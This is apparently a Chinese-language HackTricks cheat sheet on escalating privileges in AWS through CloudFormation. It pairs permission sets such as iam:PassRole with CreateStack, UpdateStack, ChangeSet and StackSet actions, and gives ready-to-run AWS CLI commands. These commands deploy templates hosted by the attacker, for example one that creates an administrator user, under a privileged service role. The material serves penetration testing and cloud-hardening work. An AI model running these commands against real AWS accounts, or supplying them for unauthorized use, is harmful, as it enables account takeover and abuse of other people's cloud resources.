# AWS - Cloudformation 权限提升

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## cloudformation

有关cloudformation的更多信息，请查看：

{% content-ref url="../../aws-services/aws-cloudformation-and-codestar-enum.md" %}
[aws-cloudformation-and-codestar-enum.md](../../aws-services/aws-cloudformation-and-codestar-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `cloudformation:CreateStack`

拥有 **`iam:PassRole`** 和 **`cloudformation:CreateStack`** 权限的攻击者可以通过创建一个CloudFormation模板来**提升权限**，该模板将使用在创建CloudFormation堆栈时传递的**角色的权限**来执行操作和创建资源。
```bash
aws cloudformation create-stack --stack-name my_stack \
--template-url http://my-website.com/my-malicious-template.template \
--role-arn arn_of_cloudformation_service_role
```
当攻击者的网站上的模板包含执行**恶意行为的指令，例如创建管理员用户**，然后使用这些凭证来提升他们自己的访问权限。

在以下页面中，您有一个**利用示例**，附加权限为**`cloudformation:DescribeStacks`**：

{% content-ref url="iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md" %}
[iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md](iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md)
{% endcontent-ref %}

**潜在影响：**提升至指定的cloudformation服务角色权限。

### `iam:PassRole`, (`cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`)

在这种情况下，您可以**滥用现有的cloudformation堆栈**，更新它并像前一个场景一样提升权限：
```bash
aws cloudformation update-stack \
--stack-name privesc \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::91029364722:role/CloudFormationAdmin2 \
--capabilities CAPABILITY_IAM \
--region eu-west-1
```
`cloudformation:SetStackPolicy` 权限可以用来**给自己 `UpdateStack` 权限**对一个堆栈进行攻击。

**潜在影响：**提升到指定的 cloudformation 服务角色权限。

### `cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`

如果你有这个权限但**没有 `iam:PassRole`**，你仍然可以**更新堆栈**并滥用它们已经附加的**IAM 角色**。检查前一节的利用示例（只是在更新时不指定任何角色）。

`cloudformation:SetStackPolicy` 权限可以用来**给自己 `UpdateStack` 权限**对一个堆栈进行攻击。

**潜在影响：**提升到已经附加的 cloudformation 服务角色权限。

### `iam:PassRole`,((`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

拥有**传递角色和创建 & 执行 ChangeSet 权限**的攻击者可以**创建/更新一个新的 cloudformation 堆栈滥用 cloudformation 服务角色**，就像使用 CreateStack 或 UpdateStack 一样。

以下利用是**CreateStack 利用的**[**变体**](./#iam-passrole-cloudformation-createstack)，使用**ChangeSet 权限**来创建堆栈。
```bash
aws cloudformation create-change-set \
--stack-name privesc \
--change-set-name privesc \
--change-set-type CREATE \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::947247140022:role/CloudFormationAdmin \
--capabilities CAPABILITY_IAM \
--region eu-west-1

echo "Waiting 2 mins to change the stack"
sleep 120

aws cloudformation execute-change-set \
--change-set-name privesc \
--stack-name privesc \
--region eu-west-1

echo "Waiting 2 mins to execute the stack"
sleep 120

aws cloudformation describe-stacks \
--stack-name privesc \
--region eu-west-1
```
`cloudformation:SetStackPolicy` 权限可以用来**给自己 `ChangeSet` 权限**对一个堆栈进行攻击。

**潜在影响：** 提升至 cloudformation 服务角色的权限。

### (`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

这种方法类似于之前的方法，不通过传递 **IAM 角色**，因此你可以直接**滥用已经附加的角色**，只需修改参数：
```
--change-set-type UPDATE
```
**潜在影响：** 提升至已连接的cloudformation服务角色的权限。

### `iam:PassRole`,(`cloudformation:CreateStackSet` | `cloudformation:UpdateStackSet`)

攻击者可以滥用这些权限来创建/更新StackSets，以滥用任意cloudformation角色。

**潜在影响：** 提升至cloudformation服务角色的权限。

### `cloudformation:UpdateStackSet`

攻击者可以在没有passRole权限的情况下滥用此权限来更新StackSets，以滥用已连接的cloudformation角色。

**潜在影响：** 提升至已连接的cloudformation角色的权限。

## 参考资料

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧。

</details>
